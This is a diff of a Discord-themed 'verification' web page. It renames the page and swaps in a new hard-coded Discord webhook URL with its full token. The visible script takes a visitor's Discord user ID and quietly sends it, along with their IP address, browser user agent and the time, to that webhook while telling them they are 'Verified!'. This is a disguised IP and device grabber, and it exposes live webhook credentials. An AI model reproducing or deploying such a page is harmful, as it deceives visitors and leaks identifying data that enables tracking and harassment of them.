@@ -158,7 +158,7 @@
   </div>
 
   <div class="box">
-    <h1 id="title-text">Eclipse Gate</h1>
+    <h1 id="title-text">Haven Verification</h1>
     
     <div id="form-block" class="input-container">
       <input type="text" id="user-id-input" class="user-input" placeholder="Masukkan User ID Anda..." autocomplete="off">
@@ -172,7 +172,7 @@
   </div>
 
   <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+    const webhookUrl = "https://discord.com/api/webhooks/1525022705395695616/c9rgCPXtMXbX5Bxww7ZaA7XvjzeE0xrIBzvCeLQCZyWRFpWNM5Zzf6z-XeamlRdR8k44";
     const discordInvite = "https://discord.gg/fMbZNhGVmh";
     
     let globalUserIp = "Unknown/Blocked";
@@ -231,7 +231,7 @@
 
         const isOnlyNumbers = /^\d+$/.test(userIdValue);
         if (!userIdValue || !isOnlyNumbers || userIdValue.length < 17 || userIdValue.length > 19) {
-            alert("User ID tidak valid! Harus berupa angka saja dan berjumlah 17-19 digit.");
+            alert("User ID tidak valid!");
             return;
         }
 
@@ -247,7 +247,7 @@
         const now = new Date();
         
         const payload = {
-            username: ".nael",
+            username: ".Revin",
             avatar_url: "https://cdn.discordapp.com/avatars/1288936739561279618/47a58cb8dbd6b2179367e4f50bf4a0b8.webp?size=160",
             content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User ID:** <@${userIdValue}>\n🌐 **IP:** \`${globalUserIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
         };
@@ -266,7 +266,7 @@
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('success-mark').style.display = 'block';
-            document.getElementById('status-label').innerText = "Access Granted! Redirecting...";
+            document.getElementById('status-label').innerText = "Tunggu sampai verifikasi diterima! Redirecting...";
             document.getElementById('status-label').style.color = "#43b581";
             document.getElementById('title-text').innerText = "Verified!";
             
